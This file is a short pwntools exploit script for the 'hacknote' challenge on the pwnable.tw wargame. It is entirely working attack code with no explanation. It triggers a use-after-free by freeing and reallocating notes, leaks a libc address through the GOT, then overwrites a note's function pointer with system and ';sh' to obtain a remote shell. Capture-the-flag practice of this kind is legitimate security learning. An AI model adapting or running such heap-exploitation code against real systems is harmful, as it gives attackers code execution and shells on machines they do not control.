from pwn import *

local = False
elf = 'hacknote'

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10102
    r = remote(ip,port)

context.arch = 'i386'
l = ELF('./libc_32.so.6')

def add(size,content):
    r.recvuntil("choice :")
    r.send("1")
    r.recvuntil("size :")
    r.send(str(size))
    r.recvuntil("Content :")
    r.send(content)

def delete(index):
    r.recvuntil("choice :")
    r.send("2")
    r.recvuntil("Index :")
    r.send(str(index))

def show(index):
    r.recvuntil("choice :")
    r.send("3")
    r.recvuntil("Index :")
    r.send(str(index))

raw_input("aaa")

libc_start_main_got = 0x804a02c
put_got = 0x804a024
fun = 0x804862b

add( 0x20 , 'aaaaaaaa')
add( 0x20 , 'aaaaaaaa')
delete( 0 )
delete( 1 )
add( 8 , p32(fun) + p32(libc_start_main_got) )
show( 0 )
l.address = u32(r.recv(4)) - 0x18540
success("libcaddr : %s" , hex(l.address))
delete(2)
add( 8 , p32(l.sym.system) + ";sh\x00" )
show(0)
r.interactive()
